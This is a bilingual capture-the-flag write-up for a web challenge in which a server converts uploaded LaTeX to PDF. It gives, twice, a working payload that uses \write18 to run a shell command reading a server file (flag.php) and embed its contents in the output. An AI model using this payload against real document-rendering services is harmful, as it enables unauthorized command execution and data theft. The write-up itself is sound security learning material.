## texmaker (web, 90p)

	description: creating and using coperate templates is sometimes really hard. luckily, 
	we have a webinterace for creating pdf files. some people doubt it's secure, but i reviewed
	the whole code and did not find any flaws.

###eng
[pl](#pl-version)

in this task we could upload latex file, which server would convert to pdf, and allow us to 
see it. as it turns out, there is a latex command, which allows us to use any system command.
hence, we could simply print out flag (base64-encoded, since latex doesn't like special
characters):
```
\immediate\write18{cat ../flag.php | base64 > script.tex 2>&1}
\openin5=script.tex
\def\readfile{%
\read5 to\curline
\ifeof5 \let\next=\relax
\else \curline˜\\
\let\next=\readfile
\fi
\next}%
\ifeof5 couldn't read the file!%
\else \readfile \closein5
\fi
```

###pl version

w tym zadaniu mogliśmy wysłać plik w latexu, który strona konwertowała do pdf-a, a następnie 
dawała do niego linka. jak się okazuje, istnieje komenda latexa do wykonania dowolnego polecenia
systemowego. korzystając z tego, wypisujemy flagę (zakodowaną base64, żeby nie zepsuć parsera):
```
\immediate\write18{cat ../flag.php | base64 > script.tex 2>&1}
\openin5=script.tex
\def\readfile{%
\read5 to\curline
\ifeof5 \let\next=\relax
\else \curline˜\\
\let\next=\readfile
\fi
\next}%
\ifeof5 couldn't read the file!%
\else \readfile \closein5
\fi
```
